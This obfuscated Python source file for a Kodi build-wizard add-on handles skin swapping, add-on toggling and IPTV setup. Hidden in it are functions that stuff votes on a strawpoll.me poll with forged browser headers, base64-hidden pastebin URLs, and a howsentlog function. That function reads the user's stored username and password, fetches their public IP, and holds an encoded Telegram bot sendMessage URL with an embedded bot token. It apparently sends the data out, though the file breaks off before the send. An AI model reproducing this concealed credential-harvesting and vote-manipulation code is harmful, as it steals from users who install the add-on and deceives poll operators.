# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:252
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	OO00O0O00O00OO0O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	O0OO00O0OOOOOOOOO =[];OOOO000OO000OOOO0 =[]#line:266
	for O0O0O0O0O0O000O0O in sorted (OO00O0O00O00OO0O0 ,key =lambda OO00O0OO00OO0O0O0 :OO00O0OO00OO0O0O0 ):#line:267
		O00O0O00000O0O00O =os .path .split (O0O0O0O0O0O000O0O [:-1 ])[1 ]#line:268
		OOO0O00OOOOO0000O =os .path .join (O0O0O0O0O0O000O0O ,'addon.xml')#line:269
		if os .path .exists (OOO0O00OOOOO0000O ):#line:270
			O0OO00OOOOO000O0O =open (OOO0O00OOOOO0000O )#line:271
			O00O0OOOO0OO0O0OO =O0OO00OOOOO000O0O .read ()#line:272
			O000OO0OO0O00OO0O =parseDOM2 (O00O0OOOO0OO0O0OO ,'addon',ret ='id')#line:273
			OOOO00O0O0O00OOOO =O00O0O00000O0O00O if len (O000OO0OO0O00OO0O )==0 else O000OO0OO0O00OO0O [0 ]#line:274
			try :#line:275
				OOO0OOOO0OO0OOOOO =xbmcaddon .Addon (id =OOOO00O0O0O00OOOO )#line:276
				O0OO00O0OOOOOOOOO .append (OOO0OOOO0OO0OOOOO .getAddonInfo ('name'))#line:277
				OOOO000OO000OOOO0 .append (OOOO00O0O0O00OOOO )#line:278
			except :#line:279
				pass #line:280
	OO0O0O00OO00OO00O =[];O00O00O00000OO00O =0 #line:281
	O0O000OO000O00000 =["Current Skin -- %s"%currSkin ()]+O0OO00O0OOOOOOOOO #line:282
	O00O00O00000OO00O =DIALOG .select ("Select the Skin you want to swap with.",O0O000OO000O00000 )#line:283
	if O00O00O00000OO00O ==-1 :return #line:284
	else :#line:285
		OO0000OO00OOO00OO =(O00O00O00000OO00O -1 )#line:286
		OO0O0O00OO00OO00O .append (OO0000OO00OOO00OO )#line:287
		O0O000OO000O00000 [O00O00O00000OO00O ]="%s"%(O0OO00O0OOOOOOOOO [OO0000OO00OOO00OO ])#line:288
	if OO0O0O00OO00OO00O ==None :return #line:289
	for OO000OO0O0O00OOO0 in OO0O0O00OO00OO00O :#line:290
		swapSkins (OOOO000OO000OOOO0 [OO000OO0O0O00OOO0 ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (OO000000O0O000000 ,title ="Error"):#line:295
	O0O0O00OOO00OOO00 ='lookandfeel.skin'#line:296
	OO0OO0000OO0O0O0O =OO000000O0O000000 #line:297
	OOOOOOO0O000O0O00 =getOld (O0O0O00OOO00OOO00 )#line:298
	O0OOO000OOO00OOOO =O0O0O00OOO00OOO00 #line:299
	setNew (O0OOO000OOO00OOOO ,OO0OO0000OO0O0O0O )#line:300
	O000O000OO0O000OO =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000OO0O000OO <100 :#line:302
		O000O000OO0O000OO +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O0O00O00OOOOOO0O0 ):#line:309
	try :#line:310
		O0O00O00OOOOOO0O0 ='"%s"'%O0O00O00OOOOOO0O0 #line:311
		OOOOO0OOOOO00O0OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O00O00OOOOOO0O0 )#line:312
		O0O0O0OOOO0O00O0O =xbmc .executeJSONRPC (OOOOO0OOOOO00O0OO )#line:314
		O0O0O0OOOO0O00O0O =simplejson .loads (O0O0O0OOOO0O00O0O )#line:315
		if O0O0O0OOOO0O00O0O .has_key ('result'):#line:316
			if O0O0O0OOOO0O00O0O ['result'].has_key ('value'):#line:317
				return O0O0O0OOOO0O00O0O ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (O000O00000OO00OO0 ,OOOO00OO000OOOO0O ):#line:324
	try :#line:325
		O000O00000OO00OO0 ='"%s"'%O000O00000OO00OO0 #line:326
		OOOO00OO000OOOO0O ='"%s"'%OOOO00OO000OOOO0O #line:327
		OO00OOOOO0OO0O0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O000O00000OO00OO0 ,OOOO00OO000OOOO0O )#line:328
		OOOO00OOOO00OO0OO =xbmc .executeJSONRPC (OO00OOOOO0OO0O0O0 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			OO00OOOOO0O0O0O0O =xbmcgui .DialogProgress ()#line:339
			OO00OOOOO0O0O0O0O .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			OO00OOOOO0O0O0O0O .update (0 )#line:343
			for OOOOOO000O0OOO00O in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				OO00OOOOO0O0O0O0O .update (int ((5 -OOOOOO000O0OOO00O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OOOOOO000O0OOO00O ),'')#line:346
				if OO00OOOOO0O0O0O0O .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			OO00OOOOO0O0O0O0O =xbmcgui .DialogProgress ()#line:352
			OO00OOOOO0O0O0O0O .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			OO00OOOOO0O0O0O0O .update (0 )#line:356
			for OOOOOO000O0OOO00O in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				OO00OOOOO0O0O0O0O .update (int ((5 -OOOOOO000O0OOO00O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OOOOOO000O0OOO00O ),'')#line:359
				if OO00OOOOO0O0O0O0O .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    O0O00OO0OOO00000O ='18773068'#line:372
    O00O00OO00OOO0O00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O00OO0OOO00000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    O0000OOOOOOOO0000 ='145273320'#line:386
    OOOOOO00OOOOO00O0 ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        O00000O00O0OOO000 =O0000OOOOOOOO0000 #line:389
    else :#line:390
        O00000O00O0OOO000 =OOOOOO00OOOOO00O0 #line:391
    OOOO000OOOOOO0OO0 ={'options':O00000O00O0OOO000 }#line:395
    OO0OO00OO000OO000 =requests .post ('https://www.strawpoll.me/'+O0O00OO0OOO00000O ,headers =O00O00OO00OOO0O00 ,data =OOOO000OOOOOO0OO0 )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        OOOO00OO0O00OOOO0 ='18773068'#line:401
        OOOOO0O0000O000OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO00OO0O00OOOO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        O0O00O00O0OO0O0O0 ='145273320'#line:415
        OO00000OOO0O00O00 ={'options':O0O00O00O0OO0O0O0 }#line:421
        OO00OO00O00O0O00O =requests .post ('https://www.strawpoll.me/'+OOOO00OO0O00OOOO0 ,headers =OOOOO0O0000O000OO ,data =OO00000OOO0O00O00 )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        OOO0OOO00O0OOO0OO ='18773068'#line:428
        O0000000OOO0OO000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO0OOO00O0OOO0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        OO0O0O000O0O00OO0 ='145273321'#line:442
        O000O000OOOO000O0 ={'options':OO0O0O000O0O00OO0 }#line:448
        O000OO0O000OO000O =requests .post ('https://www.strawpoll.me/'+OOO0OOO00O0OOO0OO ,headers =O0000000OOO0OO000 ,data =O000O000OOOO000O0 )#line:450
   except :pass #line:451
def testcommand ():#line:455
    setautorealdebrid ()#line:456
def skin_homeselect ():#line:457
	try :#line:459
		OOOOOOO0OOOO00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:460
		OO0O00OOO0O00O0OO =open (OOOOOOO0OOOO00000 ,'r')#line:462
		OO0OO00O00O00000O =OO0O00OOO0O00O0OO .read ()#line:463
		OO0O00OOO0O00O0OO .close ()#line:464
		O00OOO00O0O0O0000 ='<setting id="HomeS" type="string(.+?)/setting>'#line:465
		O000OO0OOO0OO0O0O =re .compile (O00OOO00O0O0O0000 ).findall (OO0OO00O00O00000O )[0 ]#line:466
		OO0O00OOO0O00O0OO =open (OOOOOOO0OOOO00000 ,'w')#line:467
		OO0O00OOO0O00O0OO .write (OO0OO00O00O00000O .replace ('<setting id="HomeS" type="string%s/setting>'%O000OO0OOO0OO0O0O ,'<setting id="HomeS" type="string"></setting>'))#line:468
		OO0O00OOO0O00O0OO .close ()#line:469
	except :#line:470
		pass #line:471
def autotrakt ():#line:474
    O0OOO00O000OOO000 =(ADDON .getSetting ("auto_trk"))#line:475
    if O0OOO00O000OOO000 =='true':#line:476
       from resources .libs import trk_aut #line:477
def traktsync ():#line:479
     OOOO0OO00O000OO00 =(ADDON .getSetting ("auto_trk"))#line:480
     if OOOO0OO00O000OO00 =='true':#line:481
       from resources .libs import trk_aut #line:484
     else :#line:485
        ADDON .openSettings ()#line:486
def imdb_synck ():#line:488
   try :#line:489
     O0OO0OOO00000OOOO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:490
     O00O000O0OO0OOOOO =xbmcaddon .Addon ('plugin.video.gaia')#line:491
     OOO00O00O0O000OO0 =(ADDON .getSetting ("imdb_sync"))#line:492
     O0O0O00OOO00OOOO0 ="imdb.user"#line:493
     OOOOO000OOO0OOO0O ="accounts.informants.imdb.user"#line:494
     O0OO0OOO00000OOOO .setSetting (O0O0O00OOO00OOOO0 ,str (OOO00O00O0O000OO0 ))#line:495
     O00O000O0OO0OOOOO .setSetting ('accounts.informants.imdb.enabled','true')#line:496
     O00O000O0OO0OOOOO .setSetting (OOOOO000OOO0OOO0O ,str (OOO00O00O0O000OO0 ))#line:497
   except :pass #line:498
def dis_or_enable_addon (O0OOOOO000OOOOOOO ,O0O0OO0O0O00OO0OO ,enable ="true"):#line:500
    import json #line:501
    O0O0OO0000O0O0O0O ='"%s"'%O0OOOOO000OOOOOOO #line:502
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO000OOOOOOO )and enable =="true":#line:503
        logging .warning ('already Enabled')#line:504
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OOOOO000OOOOOOO )#line:505
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO000OOOOOOO )and enable =="false":#line:506
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OOOOO000OOOOOOO )#line:507
    else :#line:508
        O00OO0O0OOO000O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O0OO0000O0O0O0O ,enable )#line:509
        O00000O000O0000OO =xbmc .executeJSONRPC (O00OO0O0OOO000O0O )#line:510
        O000O00000O0OOO00 =json .loads (O00000O000O0000OO )#line:511
        if enable =="true":#line:512
            xbmc .log ("### Enabled %s, response = %s"%(O0OOOOO000OOOOOOO ,O000O00000O0OOO00 ))#line:513
        else :#line:514
            xbmc .log ("### Disabled %s, response = %s"%(O0OOOOO000OOOOOOO ,O000O00000O0OOO00 ))#line:515
    if O0O0OO0O0O00OO0OO =='auto':#line:516
     return True #line:517
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:518
def iptvset ():#line:521
  try :#line:522
    O00OOO0OO0O0000OO =(ADDON .getSetting ("iptv_on"))#line:523
    if O00OOO0OO0O0000OO =='true':#line:525
       if KODIV >=17 and KODIV <18 :#line:527
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:528
         OOO0O000O0000O0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:529
         OO0OOOO00OOOO000O =(ADDON .getSetting ("iptvUrl"))#line:531
         OOO0O000O0000O0OO .setSetting ('m3uUrl',OO0OOOO00OOOO000O )#line:532
         OO00OO0OO00OOO0OO =(ADDON .getSetting ("epg_Url"))#line:533
         OOO0O000O0000O0OO .setSetting ('epgUrl',OO00OO0OO00OOO0OO )#line:534
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:537
         iptvsimpldownpc ()#line:538
         wiz .kodi17Fix ()#line:539
         xbmc .sleep (1000 )#line:540
         OOO0O000O0000O0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:541
         OO0OOOO00OOOO000O =(ADDON .getSetting ("iptvUrl"))#line:542
         OOO0O000O0000O0OO .setSetting ('m3uUrl',OO0OOOO00OOOO000O )#line:543
         OO00OO0OO00OOO0OO =(ADDON .getSetting ("epg_Url"))#line:544
         OOO0O000O0000O0OO .setSetting ('epgUrl',OO00OO0OO00OOO0OO )#line:545
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:547
         iptvsimpldown ()#line:548
         wiz .kodi17Fix ()#line:549
         xbmc .sleep (1000 )#line:550
         OOO0O000O0000O0OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:551
         OO0OOOO00OOOO000O =(ADDON .getSetting ("iptvUrl"))#line:552
         OOO0O000O0000O0OO .setSetting ('m3uUrl',OO0OOOO00OOOO000O )#line:553
         OO00OO0OO00OOO0OO =(ADDON .getSetting ("epg_Url"))#line:554
         OOO0O000O0000O0OO .setSetting ('epgUrl',OO00OO0OO00OOO0OO )#line:555
  except :pass #line:556
def howsentlog ():#line:563
       try :#line:564
          import json #line:565
          OOO00O00O0O0000OO =(ADDON .getSetting ("user"))#line:566
          O0OOOO000O000OO0O =(ADDON .getSetting ("pass"))#line:567
          O0O0OO0O0O0OOO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:568
          OOO0O00OO0OO0O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:570
          O0OO0OOO0O0O000OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:571
          OO0O00000OOOO0O00 =str (json .loads (O0OO0OOO0O0O000OO )['ip'])#line:572
          OO00OO0O0O0O000O0 =OOO00O00O0O0000OO #line:573
          O000O0O00O0O0O0O0 =O0OOOO000O000OO0O #line:574
          import socket #line:576
